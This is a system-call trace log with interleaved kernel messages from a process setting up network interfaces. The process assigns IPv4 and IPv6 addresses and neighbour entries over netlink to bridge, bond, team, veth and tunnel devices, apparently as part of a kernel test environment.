[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6gretap0", ifr_ifindex=12}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x0c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x15\x08\x00\x01\x00\xac\x14\x14\x15"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6gretap0", ifr_ifindex=12}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x0c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ip6gretap0", ifr_ifindex=12}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x0c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x15\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="erspan0", ifr_ifindex=5}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x05\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x16\x08\x00\x01\x00\xac\x14\x14\x16"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="erspan0", ifr_ifindex=5}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x05\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="erspan0", ifr_ifindex=5}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x16\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond0", ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x0f\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x17\x08\x00\x01\x00\xac\x14\x14\x17"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond0", ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x0f\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond0", ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x17\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0", ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x17\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x18\x08\x00\x01\x00\xac\x14\x14\x18"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0", ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x17\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0", ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x18\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1", ifr_ifindex=24}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x18\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x19\x08\x00\x01\x00\xac\x14\x14\x19"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1", ifr_ifindex=24}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x18\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1", ifr_ifindex=24}) = 0
[pid  5086] close(4)                    = 0
[   76.857818][   T22] bridge0: port 1(bridge_slave_0) entered disabled state
[   76.866716][   T22] bridge0: port 2(bridge_slave_1) entered disabled state
[   76.880360][ T5086] 8021q: adding VLAN 0 to HW filter on device bond0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x19\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team0", ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x10\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1a\x08\x00\x01\x00\xac\x14\x14\x1a"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team0", ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x10\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team0", ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1a\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_bridge", ifr_ifindex=28}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x1c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1b\x08\x00\x01\x00\xac\x14\x14\x1b"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_bridge", ifr_ifindex=28}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x1c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_bridge", ifr_ifindex=28}) = 0
[pid  5086] close(4)                    = 0
[   76.921978][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1: link becomes ready
[   76.933864][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0: link becomes ready
[   76.956434][ T5086] 8021q: adding VLAN 0 to HW filter on device team0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1b\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_bridge", ifr_ifindex=30}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x1e\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1c\x08\x00\x01\x00\xac\x14\x14\x1c"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_bridge", ifr_ifindex=30}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x1e\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_bridge", ifr_ifindex=30}) = 0
[pid  5086] close(4)                    = 0
[   76.980426][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_bridge: link becomes ready
[   76.989968][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): bridge_slave_0: link becomes ready
[   77.000169][ T1120] bridge0: port 1(bridge_slave_0) entered blocking state
[   77.007359][ T1120] bridge0: port 1(bridge_slave_0) entered forwarding state
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1c\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_bond", ifr_ifindex=32}) = 0
[pid  5086] close(4)                    = 0
